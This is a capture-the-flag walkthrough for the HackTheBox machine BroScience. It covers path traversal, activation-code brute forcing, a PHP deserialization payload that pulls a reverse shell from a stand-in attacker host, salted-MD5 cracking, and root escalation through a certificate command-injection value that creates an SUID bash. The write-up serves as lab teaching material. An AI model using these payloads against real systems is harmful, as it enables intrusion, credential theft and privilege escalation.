---
title: HTB - BroScience
author: nirajkharel
date: 2023-04-08 14:10:00 +0800
categories: [HackTheBox]
tags: [HTB, HackTheBox]
render_with_liquid: false
---

# HTB — BroScience. 

A detailed walkthrough for solving BroScience Box on HTB. The box contains vulnerability like Path Traversal and PHP Deserialization from where we can have low priv access. Enumerating the processes which runs by root can lead to privilege escalation.

<img alt="" class="bg lw lx c" loading="eager" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*WQ_p6-Ulr3bS1B-RNXeDYw.png" width="700" height="500">

**Enumeration**

**NMAP**

Let’s start with an NMAP Scanning to enumerate open ports and the services running on the IP.

```
nmap -sC -sV -oA nmap/10.10.11.195 10.10.11.195 -v
```

```
Nmap scan report for 10.10.11.195
Host is up (0.38s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 df:17:c6:ba:b1:82:22:d9:1d:b5:eb:ff:5d:3d:2c:b7 (RSA)
|   256 3f:8a:56:f8:95:8f:ae:af:e3:ae:7e:b8:80:f6:79:d2 (ECDSA)
|_  256 3c:65:75:27:4a:e2:ef:93:91:37:4c:fd:d9:d4:63:41 (ED25519)
80/tcp  open  http     Apache httpd 2.4.54
|_http-title: Did not follow redirect to https://broscience.htb/
| http-methods:
|_  Supported Methods: HEAD POST OPTIONS
|_http-server-header: Apache/2.4.54 (Debian)
443/tcp open  ssl/http Apache httpd 2.4.54 ((Debian))
|_http-server-header: Apache/2.4.54 (Debian)
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
| ssl-cert: Subject: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Issuer: commonName=broscience.htb/organizationName=BroScience/countryName=AT
| Public Key type: rsa
| Public Key bits: 4096
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-07-14T19:48:36
| Not valid after:  2023-07-14T19:48:36
| MD5:   5328 ddd6 2f34 29d1 1d26 ae8a 68d8 6e0c
|_SHA-1: 2056 8d0d 9e41 09cd e5a2 2021 fe3f 349c 40d8 d75b
|_http-title: BroScience : Home
| http-cookie-flags:
|   /:
|     PHPSESSID:
|_      httponly flag not set
|_ssl-date: TLS randomness does not represent time
| tls-alpn:
|_  http/1.1
Service Info: Host: broscience.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


Add IP 10.10.11.195 on /etc/hosts file of an attacking machine and open [https://broscience.htb](https://broscience.htb/) on a browser. It looks like an application related to fitness and contains login and registration panel. Registrate a new user. We can see that an application shows a message that registration link is provided on an email but a link is not received. We need to try other ways.

**Directory Busting**

```
python3 dirsearch.py -u https://broscience.htb/ -e php -i 200
```


```
Target: https://broscience.htb/
[14:34:14] Starting:
[14:35:22] 200 -    2KB - /images/
[14:35:22] 200 -    2KB - /includes/
[14:35:23] 200 -   17KB - /index.php
[14:35:23] 200 -   17KB - /index.php/login/
[14:35:28] 200 -    2KB - /login.php
[14:35:30] 200 -  676B  - /manual/index.html
[14:35:45] 200 -    2KB - /register.php
[14:35:58] 200 -    1KB - /user.php
```


```
gobuster dir -u https://broscience.htb -w /usr/share/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -x .php -k
```


```
===============================================================
2023/01/14 14:40:19 Starting gobuster in directory enumeration mode
===============================================================
/images               (Status: 301) [Size: 319] [--> https://broscience.htb/images/]
/index.php            (Status: 200) [Size: 17411]
/login.php            (Status: 200) [Size: 1936]
/register.php         (Status: 200) [Size: 2161]
/user.php             (Status: 200) [Size: 1309]
/comment.php          (Status: 302) [Size: 13] [--> /login.php]
/includes             (Status: 301) [Size: 321] [--> https://broscience.htb/includes/]
/manual               (Status: 301) [Size: 319] [--> https://broscience.htb/manual/]
/javascript           (Status: 301) [Size: 323] [--> https://broscience.htb/javascript/]
/logout.php           (Status: 302) [Size: 0] [--> /index.php]
/styles               (Status: 301) [Size: 319] [--> https://broscience.htb/styles/]
/activate.php         (Status: 200) [Size: 1256]
/exercise.php         (Status: 200) [Size: 1322]
```


Lets navigate through an application, we can find an endpoint where we could enumerate the users on an application.

Users: administrator,bill,michael,john,dmytro

Tried to brute force into a login panel without any success.

**Initial Attack**

Navigate into each directories and files enumerated with directory busting. We find that there are multiple interesting PHP files inside /includes/.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*FHjTM606YWfP7Y5SEKZCxw.png" width="700" height="377">

But since we need a medium to view the contents on file, we need to find a way. Surfing through an application again, we can find an endpoint which might result in Path Traversal.

[https://broscience.htb/includes/img.php?path=bench.png](https://broscience.htb/includes/img.php?path=bench.png)

Setup a BurpSuite and Intercept a request. Try to view the contents of the PHP files. After multiple trial and errors, I discovered that we need to double URL encode the payload to successfully execute it.

Double URL encode ../includes/db\_connect.php and set it as a value for path parameter.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*EjkOLKqYyYMPJSn6N3S-6Q.png" width="700" height="333">

We can find database credentials on it. Since the database is postgres and we do not have port 5432 open, we cannot initiate an attack with it, but it should be helpful during further exploitation.

View other contents of the PHP files. When viewing the contents of utils.php, we can find a code responsible for handling the activation process.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*grsiQHz9S_3ef8dMDAW-sQ.png" width="700" height="281">

The code above generates a random activation code. Lets download the code and modify a little bit so that it generates multiple activation code. We then need to brute force it on /activation/ path discovered through above directory busting.

```
<?php
    $chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890";
    for ($k = 0; $k < 5000; $k++)
  {
    srand(time()-$k);
    echo "\n";
    $activation_code = "";
    for ($i = 0; $i < 32; $i++) {
        $activation_code = $activation_code . $chars[rand(0, strlen($chars) - 1)];
    }
    echo $activation_code;
}
```


We can run the above code in Terminal with **php activate.php.** Or we can use any online PHP compiler. Before running the code, make sure you registered a new account in an application.

After account registration, navigate to [https://broscience.htb/activate.php?code=test](https://broscience.htb/activate.php?code=test) and intercept the request with burp. Send the request to Intruder and perform brute force on **code** parameter.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*hxfWrwq3N8StlP234wtJWg.png" width="700" height="448">

Once the account is activated, login into an application with registered username and password.

I didn’t find any kind of useful attack surfaces on an application and spent a lot of time in authenticated enumeration. After a while, I navigated through utils.php again and found that it uses serializations for session cookie generation. Might be it is vulnerable to PHP Deserialization attack On decoding the session cookie, I found **_O:9:”UserPrefs”:1:{s:5:”theme”;s:5:”light”;}_**

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*hgQyTtXkfFN3GIpRQoNC1A.png" width="700" height="232">

Since I was not much familiar about PHP serializations, I researched about its format from [https://portswigger.net/web-security/deserialization/exploiting](https://portswigger.net/web-security/deserialization/exploiting)

Let's download the code from utils.php and analyze through it.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*3zqsPPibUAylRJtEQqaUIg.png" width="700" height="461">

I figured out that the class **AvatarInterface** has two variables **tmp** and **imgPath** and calls a class **Avatar** and a class **Avatar** opens the provided file from tmp and write its content into imgPath.

Lets create a payload which generates a serialized data. About an attack scenario, we will be download a [PHP reverse shell code](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and save it on a TXT format. We will host a code on an attacker machine. The serialized code will open the TXT file hosted and writes into is root directory as PHP file. The payload is

```
<?php
class Avatar {
    public $imgPath;
    public function __construct($imgPath) {
        $this->imgPath = $imgPath;
    }
    public function save($tmp) {
        $f = fopen($this->imgPath, "w");
        fwrite($f, file_get_contents($tmp));
        fclose($f);
    }
}
class AvatarInterface {
    public $tmp = "http://attacker-ip:1337/shell.txt";
    public $imgPath = "shell.php";
    public function __wakeup() {
        $a = new Avatar($this->imgPath);
        $a->save($this->tmp);
    }
}
$payload = base64_encode(serialize(new AvatarInterface));
echo $payload;
?>
```


Run the code and host a reverse shell.txt

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*O_75EEQA36Cey5LlB2q_zw.png" width="700" height="145">

Login into an application and replace the user-prefs parameter with the generated above.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*Z_q3KbVL2mRv_xXaxgGQmw.png" width="700" height="320">

Navigate to [https://broscience.htb/shell.php.](https://broscience.htb/shell.php.) Setup a netcat listener. We can have a reverse shell as www-data user.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*CpVg8RI5UB2Wf2THUZ_HMw.png" width="700" height="297">

We can see that there is a user bill on a system but we are not authorized to view the user flag.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*vhRaZgup2OI2mLlm1x1Mgg.png" width="700" height="410">

But as we revert back to Path Traversal, we were able to view the database credentials of postgres. Lets login into the database.

Login into the database.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*sI9TH3JzoMGBGQPtSLyyxw.png" width="700" height="347">

We can find a users hash on the database. List out all the users and hash. Since we have user bill on the system. Let us focus on the bill user and hash at first.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*GTuFBFu3MkUGfSWE_AIPNA.png" width="700" height="212">

It is a 32 Bit characters, might be MD5. Tried using hashcat to find a plaintext without any success. As we go back to application’s authentication process, we can assume that hashing of password might be performed on registration process. View the content of register.php and we found that MD5 with salt is used to hash the password.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*2ls8XW-x4eH_6Ck_lrRE2g.png" width="700" height="269">

Viewing the content of db\_connect.php again, we can find the db\_salt which is “Nacl”. Add a salt in hash. We can find a bill password.

```
echo "13edad4932da9dbb57d9cd15b66ed104:NaCl" > hash.txt
hashcat -a 0 -m 20 hash.txt rockyou.txt
```


User Flag
---------

SSH into a box using bill credentials.

```
ssh bill@10.10.11.195
# Enter a cracked password
```

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*McviOY-0cjT3c1eITrTziA.png" width="700" height="233">

Privilege Escalation
--------------------

Run [Pspy](https://github.com/DominicBreuker/pspy).

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*ke4qPW9DSOfT6s4ltSgosw.png" width="700" height="38">

Viewing the process owned by root. We can see that the script /opt/renew\_cert.sh runs in every 10 seconds and it takes /home/bill/Certs/broscience.crt as an argument.

```
./pspy64 -i 100
```


Viewing the contents of the file, it checks whether provided certificate file is expired or not. And if expired, it executes an openssl command to create a outdated certificate file.

We first need to create a certificate which has 1 day expiration and replace it with previous broscience.crt file.

```
openssl req -x509 -sha256 -nodes -newkey rsa:4096 -keyout /home/bill/Certs/broscience.key -out /home/bill/Certs/broscience.crt -days 1
# In CN, inject with a command which copies the /bin/bash to /tmp/bash and assign it SGID
test; $(cp /usr/bin/bash /tmp/bash; chmod +s /tmp/bash)
# We can also copy the root.txt file
test; $(cp /root/root.txt /tmp/root.txt)
```

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*l-6ctKMZlGbaSkF9i5Rp2Q.png" width="700" height="232">

Wait for 10 seconds, and there must be a /tmp/bash file.

<img alt="" class="bg lw lx c" loading="lazy" role="presentation" src="https://miro.medium.com/v2/resize:fit:1400/1*xhHNumjgeFMiMeCQlGSQAg.png" width="700" height="191">

Here you go. Happy Hacking !!!